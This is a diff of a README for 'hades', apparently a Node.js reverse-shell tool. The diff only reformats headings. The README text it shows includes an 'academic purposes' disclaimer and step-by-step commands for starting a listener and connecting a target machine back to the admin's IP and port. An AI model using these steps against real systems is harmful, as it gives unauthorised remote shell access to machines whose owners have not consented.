@@ -6,17 +6,17 @@ This program is written in Typescript and is made to run with [Node.js](https://
 ![image info](demo.png)
 
 ## How to use
-Disclaimer
+### Disclaimer
 - This reverse shell is for academic purposes, the use of this software is your responsibility.
 - This software is still in development, not all the features are implemented yet.
 
-Use with Node.js
+### Use with Node.js
 1) Run `npm install`
 2) Run `node src/main.js -a [port to listen on]` on the main machine.
 3) Run `node src/main.js -c [admin's port] [admin's ip]` on a target machine.
 4) Done !
 
-Use a compiled version 
+### Use a compiled version 
 1) Garb a compiled version of the program.
 2) Run `hades -a [port to listen on]` on the main machine.
 3) Run `hades -c [admin's port] [admin's ip]` on a target machine.
